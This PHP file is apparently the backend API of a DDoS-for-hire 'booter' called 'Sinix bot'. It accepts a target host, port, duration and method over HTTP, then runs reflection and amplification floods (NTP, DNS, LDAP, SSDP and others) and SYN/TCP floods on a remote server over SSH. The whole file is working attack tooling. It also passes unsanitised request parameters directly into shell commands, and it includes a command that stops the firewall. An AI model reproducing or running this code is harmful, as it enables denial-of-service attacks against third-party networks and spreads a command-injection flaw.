<?php
ignore_user_abort(true);
set_time_limit(2);
 
$server_ip = "IP";
$server_pass = "PASS";
$server_user = "USER";
 
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];
$time2 = $time;
$limiter = '200000';
$threads = '2';
 
//arrays
$array = array("stop","STOP","STOPALL","LDAP","SSDP","NTP","PORTMAP","CHARGEN","NETBIOS","SNMP","TS3","TFTP","RIP","SENTINEL","MSSQL","MDNS","DNS","DB2","HEARTBEAT","QUAKE","DRDOS","CSYN","DOMINATE","ESSYN","FRAG","ISSYN","SSYN","RST","TCP","TCP-ACK","TCP-FIN","TCP-XMAS","TCP-RST","TCP-PSH","TCP-SE","TELNET","VSE","WIZARD","XACK","XDCMP","XMAS","XSYN","ZAP","ZSYN","GREENSYN","SYNACK","SYNACKB","PROWIN","SYN9","WINSEQID","WINSYN","YUBINA",'SYNACKB');
$ray = array("oommnjkjdhfjhfjdsaf");
 
 
if (!empty($key)){
}else{
die('Error: API key is empty!');}
 
 
if (in_array($key, $ray)){
}else{
die('Error: Incorrect API key!');}
 
 
if (!empty($time)){
}else{
die('Error: time is empty!');}
 
 
if (!empty($host)){
}else{
die('Error: Host is empty!');}
 
if (!empty($method)){
}else{
die('Error: Method is empty!');}
 
 
if (in_array($method, $array)){
}else{
die('Error: The method you requested does not exist!');}
 
if ($port > 66605){
die('Error: Ports over 66605 do not exist');}
       
if ($time > 3600){                                       //if you with to change the time literally just change
die('Error: Cannot exceed 3600 seconds!');}              // time > 3600 to desired time, and change the "exceed 3600 seconds" to the desired time
 
//scanned methods
if ($method == "LDAP") { $command = "./ldap $host $port ldap.txt $threads $limiter $time"; }  //ldap method
if ($method == "SSDP") { $command = "./ssdp $host $port ssdp.txt $threads $limiter $time"; } //ssdp method
if ($method == "NTP") { $command = "./ntp $host $port ntp.txt $threads $limiter $time"; }   //NTP method
if ($method == "PORTMAP") { $command = "./portmap $host $port portmap.txt $threads $limiter $time"; } //portmap method
if ($method == "CHARGEN") { $command = "./chargen $host $port chargen.txt $threads $limiter $time"; } //chargen method
if ($method == "NETBIOS") { $command = "./ldap $host $port netbios.txt $threads $limiter $time"; }  //netbios method
if ($method == "SNMP") { $command = "./ssdp $host $port snmp.txt $threads $limiter $time"; } //snmp method
if ($method == "TS3") { $command = "./ntp $host $port ts3.txt $threads $limiter $time"; }   //ts3 method
if ($method == "TFTP") { $command = "./portmap $host $port tftp.txt $threads $limiter $time"; } //tftp method
if ($method == "RIP") { $command = "./chargen $host $port rip.txt $threads $limiter $time"; } //rip method
if ($method == "SENTINEL") { $command = "./ssdp $host $port sentinel.txt $threads $limiter $time"; } //sentinel method
if ($method == "MSSQL") { $command = "./ntp $host $port mssql.txt $threads $limiter $time"; }   //mssql method
if ($method == "MDNS") { $command = "./portmap $host $port mdns.txt $threads $limiter $time"; } //mdns method
if ($method == "DNS") { $command = "./ntp $host $port dns.txt $threads $limiter $time"; }   //dns method
if ($method == "DB2") { $command = "./portmap $host $port db2.txt $threads $limiter $time"; } //db2 method
if ($method == "HEARTBEAT") { $command = "./chargen $host $port heartbeat.txt $threads $limiter $time"; } //heartbeat method
if ($method == "QUAKE") { $command = "./quake $host $port quake.txt $threads $limiter $time"; } //quake method
if ($method == "DRDOS") { $command = "./drdos $host $port drdos.txt $threads $time"; } //drdos
 
//non scanned methods 
if ($method == "CSYN") { $command = "./csyn $host $port $threads $limiter $time"; } //csyn method
if ($method == "DOMINATE") { $command = "./dominate $host $port $threads $limiter $time"; } //dominate method
if ($method == "ESSYN") { $command = "./essyn.c $host $port $threads $limiter $time"; } //essyn method
if ($method == "FRAG") { $command = "./frag $host $port $threads $limiter $time"; } //frag method
if ($method == "ISSYN") { $command = "./issyn.c $host $threads $limiter $time"; } //issyn method
if ($method == "SSYN") { $command = "./ssyn $host $port $threads $limiter $time"; } //ssyn method
if ($method == "RST") { $command = "./rst $host $threads $limiter $time"; } //rst method
if ($method == "TCP") { $command = "./tcp $host $port $threads $limiter $time"; } //tcp method
if ($method == "TCP-ACK") { $command = "./tcp-ack $host $threads $limiter $time"; } //tcp-ack method
if ($method == "TCP-FIN") { $command = "./tcp-fin $host $threads $limiter $time"; } //tcp-fin method
if ($method == "TCP-XMAS") { $command = "./tcp-xmas $host $threads $limiter $time"; } //tcp-xmas method
if ($method == "TCP-RST") { $command = "./tcp-rst $host $threads $limiter $time"; } //tcp-rst method
if ($method == "TCP-PSH") { $command = "./tcp-psh $host $threads $limiter $time"; } //tcp-rst method
if ($method == "TCP-SE") { $command = "./tcp-se $host $port $threads $limiter $time"; } //tcp-se method
if ($method == "TELNET") { $command = "./telnet.c $host $threads $limiter $time"; } //telnet method
if ($method == "VSE") { $command = "./vse $host $threads $limiter $time"; } //vse method
if ($method == "WIZARD") { $command = "./tcp-ack $host $port $threads $limiter $time"; } //wizard method
if ($method == "XACK") { $command = "./xack $host $threads $limiter $time"; } //xack method
if ($method == "XDCMP") { $command = "./telnet.c $host $port other.txt $threads $limiter $time"; } //xdcmp method
if ($method == "XMAS") { $command = "./xmas $host $threads $limiter $time"; } //xmas method
if ($method == "XSYN") { $command = "./xsyn $host $port $threads $limiter $time"; } //xsyn method
if ($method == "ZAP") { $command = "./zap $host $port $threads $limiter $time"; } //zap method
if ($method == "ZSYN") { $command = "./zsyn $host $port $threads $limiter $time"; } //zap method
 
//special tcpmethods
if ($method == "GREENSYN") { $command .= "screen -dm timeout $time sh greensyn.sh $host $port "; }
if ($method == "SYNACK") { $command .= "screen -dm timeout $time sh synack.sh $host $port "; }
if ($method == "SYN9") { $command .= "screen -dm timeout $time sh syn9.sh $host $port "; }
if ($method == "SYNACKB") { $command .= "screen -dm timeout $time sh synackb.sh $host $port "; }
if ($method == "PROWIN") { $command .= "./prowin $host "; }
if ($method == "WINSEQID") { $command .= "./winseqid.c $host "; }
if ($method == "WINSYN") { $command .= "./winsyn.c $host "; }
if ($method == "YUBINA") { $command .= "./yubina.c $host "; }

if ($method == "STOP") { $command = "pkill $host -f"; }
if ($method == "stop") { $command = "pkill $host -f"; }
if ($method == "STOPALL") { $command = "pkill all"; }
if ($method == "EMERGENCY1") { $command = "service ssh restart | service iptables stop"; }
 
 
if (!function_exists("ssh2_connect")) die("Error: SSH2 does not exist on you're server");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {
 
 
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
        echo "Error: Login failed, one or more of you're server credentials are incorrect.";
    } else {
       
 
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {
 
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
                        echo "Sinix bot :</br>Hitting: $host</br>On Port: $port </br>Attack Length: $time</br>With: $method " ;
            fclose($stream);
        }
    }
}
?>